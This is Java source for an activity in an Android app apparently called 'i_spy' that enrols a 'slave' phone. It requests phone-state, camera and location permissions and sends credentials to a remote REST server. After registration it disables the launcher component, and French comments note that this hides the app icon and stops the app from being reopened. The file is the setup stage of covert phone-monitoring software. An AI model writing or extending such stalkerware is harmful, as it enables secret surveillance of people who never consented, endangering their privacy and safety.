package com.um.asn.i_spy;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Process;
import android.os.SystemClock;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.concurrent.ExecutionException;

public class RegisterSlaveActivity extends AppCompatActivity {

    public final static int REQUEST_ALL_PERM = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_register_slave);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
        {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_PHONE_STATE))
            {

            }
            else
            {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.CAMERA, Manifest.permission.LOCATION_HARDWARE},
                        REQUEST_ALL_PERM);
            }
        }

        Button registerSlaveButton = (Button) findViewById(R.id.register_slave_button);

        registerSlaveButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                final EditText register_slave_login = (EditText) findViewById(R.id.register_slave_login);
                final EditText register_slave_password = (EditText) findViewById(R.id.register_slave_password);

                if(!register_slave_login.getText().toString().equals("") && !register_slave_password.getText().toString().equals("")) {

                    ConnectivityManager connMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

                    NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();
                    if (networkInfo != null && networkInfo.isConnected()) {

                    /* Creation de l'url pour atteindre le serveur REST, a changer par calyxe.fr */
                        String url = "https://ispy.calyxe.fr/index.php/phone/";


                        JSONObject jo = new JSONObject();
                        try {
                            jo.put("password", register_slave_password.getText().toString());
                            jo.put("number", register_slave_login.getText().toString());
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    /* Creation d'un objet HttpPostTask et execution de la méthode
                     * doInBackground */
                        JSONObject result = null;
                        try {
                            result = new JSONObject(
                                    (String) new HttpPostTask().execute(new Object[]{url, jo.toString()}).get()
                            );

                            if ((boolean)result.get("success")) {
                                JSONObject data = (JSONObject) result.get("data");

                                Toast.makeText(RegisterSlaveActivity.this, R.string.success, Toast.LENGTH_LONG).show();

                                try {
                                    FileOutputStream file = openFileOutput("slave.txt", MODE_PRIVATE);
                                    file.write(data.toString().getBytes());
                                    file.close();
                                } catch (FileNotFoundException e) {
                                    e.printStackTrace();
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }

                                // Pour cacher l'icon de l'application dans la liste des app
                                // Ferme l'app et empêche de la réouvrir...
                                // Il faut la désinstaller et réinstaller
                                PackageManager p = getPackageManager();
                                ComponentName componentName = new ComponentName(
                                        RegisterSlaveActivity.this,
                                        com.um.asn.i_spy.ChooseModeActivity.class
                                );
                                p.setComponentEnabledSetting(
                                        componentName,
                                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                        PackageManager.DONT_KILL_APP
                                );

                                // Ferme l'activité mais pas l'app
                                //finish();
                            } else {
                                Toast.makeText(RegisterSlaveActivity.this, R.string.error, Toast.LENGTH_LONG).show();
                            }

                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        } catch (ExecutionException e) {
                            e.printStackTrace();
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }


                    } else {
                        Toast.makeText(RegisterSlaveActivity.this, R.string.message_internet_connection_error, Toast.LENGTH_LONG).show();
                    }
                }
            }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        switch (requestCode) {
            case REQUEST_ALL_PERM: {
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    Toast.makeText(RegisterSlaveActivity.this, "PERM OK !", Toast.LENGTH_LONG).show();

                } else {

                    Toast.makeText(RegisterSlaveActivity.this, "PERM NOT OK !", Toast.LENGTH_LONG).show();
                }
                return;
            }
        }
    }

    @Override
    public void onBackPressed(){
        finish();
    }
}
